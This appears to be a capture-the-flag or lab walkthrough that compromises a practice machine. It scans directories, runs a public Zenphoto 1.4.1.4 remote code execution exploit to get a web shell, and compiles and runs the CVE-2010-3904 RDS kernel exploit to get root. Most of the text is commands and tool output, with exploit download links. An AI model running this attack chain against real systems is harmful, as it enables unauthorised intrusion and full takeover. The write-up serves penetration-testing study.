### Directory scan
```bash
❯ feroxbuster -u http://$IP -t 50 -w /usr/share/wordlists/dirb/common.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.200.41
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        4l        5w       75c http://192.168.200.41/
403      GET       10l       30w      286c http://192.168.200.41/.hta
403      GET       10l       30w      291c http://192.168.200.41/.htaccess
403      GET       10l       30w      290c http://192.168.200.41/cgi-bin/
403      GET       10l       30w      299c http://192.168.200.41/cgi-bin/.htaccess
403      GET       10l       30w      299c http://192.168.200.41/cgi-bin/.htpasswd
403      GET       10l       30w      294c http://192.168.200.41/cgi-bin/.hta
200      GET        4l        5w       75c http://192.168.200.41/index
200      GET        4l        5w       75c http://192.168.200.41/index.html
301      GET        9l       28w      315c http://192.168.200.41/test => http://192.168.200.41/test/
403      GET       10l       30w      295c http://192.168.200.41/server-status
403      GET       10l       30w      291c http://192.168.200.41/test/.hta
403      GET       10l       30w      296c http://192.168.200.41/test/.htpasswd
403      GET       10l       30w      296c http://192.168.200.41/test/.htaccess
301      GET        9l       28w      322c http://192.168.200.41/test/albums => http://192.168.200.41/test/albums/
301      GET        9l       28w      321c http://192.168.200.41/test/cache => http://192.168.200.41/test/cache/
200      GET        1l        2w     1406c http://192.168.200.41/test/favicon.ico
200      GET      101l      416w     5015c http://192.168.200.41/test/index
200      GET      101l      416w     5015c http://192.168.200.41/test/index.php
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_200_41-1663730014.state ...
[###########>--------] - 57s    16137/27684   41s     found:19      errors:140    
[####################] - 43s     4614/4614    107/s   http://192.168.200.41 
[####################] - 45s     4614/4614    102/s   http://192.168.200.41/ 
[####################] - 33s     4614/4614    139/s   http://192.168.200.41/cgi-bin/ 
[#########>----------] - 18s     2283/4614    126/s   http://192.168.200.41/test 
[####################] - 0s      4614/4614    0/s     http://192.168.200.41/test/albums => Directory listing (add -e to scan)
[####################] - 0s      4614/4614    0/s     http://192.168.200.41/test/cache => Directory listing (add -e to scan)
```

### Not a common box since the inspect
http://192.168.200.41/test/index.php?p=search

`<script type="text/javascript" src="/test/zp-core/js/admin.js"></script>`

```html
 zenphoto version 1.4.1.4 [8157] (Official Build) THEME: default (search.php) GRAPHICS LIB: PHP GD library 2.0 { memory: 128M } PLUGINS: class-video colorbox deprecated-functions hitcounter security-logger tiny_mce zenphoto_news zenphoto_sendmail zenphoto_seo  
 ```

### Jump in
* http://192.168.200.41/test/zp-core
* http://192.168.200.41/test/zp-core/admin.php

`searchsploit zenphoto 1.4.1.4`

### Unique one as the exploit in PHP
```bash
❯ php 18083.php $IP /test/zp-core

+-----------------------------------------------------------+
| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |
+-----------------------------------------------------------+

zenphoto-shell# id

[-] Exploit failed!
                                                                                                                                                                                            
❯ php 18083.php $IP /test/

+-----------------------------------------------------------+
| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |
+-----------------------------------------------------------+

zenphoto-shell# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Root
linux-exploit-suggester.sh 
```bash
ww-data@offsecsrv:/tmp$ ./linux-exploit-suggester.sh                           
./linux-exploit-suggester.sh

Available information:

Kernel version: 2.6.32
Architecture: i686
Distribution: ubuntu
Distribution version: 10.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

79 kernel space exploits
49 user space exploits

Possible Exploits:

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,[ ubuntu=10.04{kernel:2.6.32-21-generic} ],ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2010-3904] rds <-- The second one works

   Details: http://www.securityfocus.com/archive/1/514379
   Exposure: highly probable
   Tags: debian=6.0{kernel:2.6.(31|32|34|35)-(1|trunk)-amd64},ubuntu=10.10|9.10,fedora=13{kernel:2.6.33.3-85.fc13.i686.PAE},[ ubuntu=10.04{kernel:2.6.32-(21|24)-generic} ]
   Download URL: http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c
   ```

linpeas.sh
`RED: You should take a look to it`
```bash
These are in red
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,[ ubuntu=10.04{kernel:2.6.32-21-generic} ],ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2010-3904] rds

   Details: http://www.securityfocus.com/archive/1/514379
   Exposure: highly probable
   Tags: debian=6.0{kernel:2.6.(31|32|34|35)-(1|trunk)-amd64},ubuntu=10.10|9.10,fedora=13{kernel:2.6.33.3-85.fc13.i686.PAE},[ ubuntu=10.04{kernel:2.6.32-(21|24)-generic} ]
   Download URL: http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c
--
```


https://www.exploit-db.com/exploits/15285

### Exploit
```bash
www-data@offsecsrv:/tmp$ gcc linux-rds-exploit.c -o exploit
gcc linux-rds-exploit.c -o exploit
www-data@offsecsrv:/tmp$ chmod +x exploit
chmod +x exploit
www-data@offsecsrv:/tmp$ ./exploit
./exploit
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved rds_proto_ops to 0xf825d980
 [+] Resolved rds_ioctl to 0xf8257090
 [+] Resolved commit_creds to 0xc016dcc0
 [+] Resolved prepare_kernel_cred to 0xc016e000
[*] Overwriting function pointer...
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved rds_proto_ops to 0xf825d980
 [+] Resolved rds_ioctl to 0xf8257090
 [+] Resolved commit_creds to 0xc016dcc0
 [+] Resolved prepare_kernel_cred to 0xc016e000
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...

id
uid=0(root) gid=0(root)
```